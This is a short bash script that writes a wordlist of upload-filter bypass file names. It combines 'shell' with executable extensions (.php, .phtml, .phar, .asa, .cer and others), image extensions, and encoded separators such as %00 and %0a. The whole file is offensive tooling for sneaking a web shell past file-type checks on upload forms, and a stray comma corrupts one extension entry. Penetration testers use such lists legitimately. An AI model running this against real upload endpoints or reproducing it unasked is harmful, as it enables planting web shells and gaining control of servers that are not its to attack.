for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.pht' '.phar' '.pgif' '.phtml' '.phtm' '.php' '.php3' '.php4' '.php5' '.phps' '.jpg' '.jpeg' '.png' '.gif' '.bmp' '.svg' '.tiff' '.shtml', '.asa' '.cer' '.asax' '.swf' '.xap'; do
        echo "shell$char$ext" >> wordlist.txt
        echo "shell$ext$char" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
        echo "shell.png$char$ext" >> wordlist.txt
        echo "shell.png$ext$char" >> wordlist.txt
        echo "shell.gif$char$ext" >> wordlist.txt
        echo "shell.gif$ext$char" >> wordlist.txt
        echo "shell.bmp$char$ext" >> wordlist.txt
        echo "shell.bmp$ext$char" >> wordlist.txt
        echo "shell.svg$char$ext" >> wordlist.txt
        echo "shell.svg$ext$char" >> wordlist.txt
        echo "shell.tiff$char$ext" >> wordlist.txt
        echo "shell.tiff$ext$char" >> wordlist.txt
    done
done
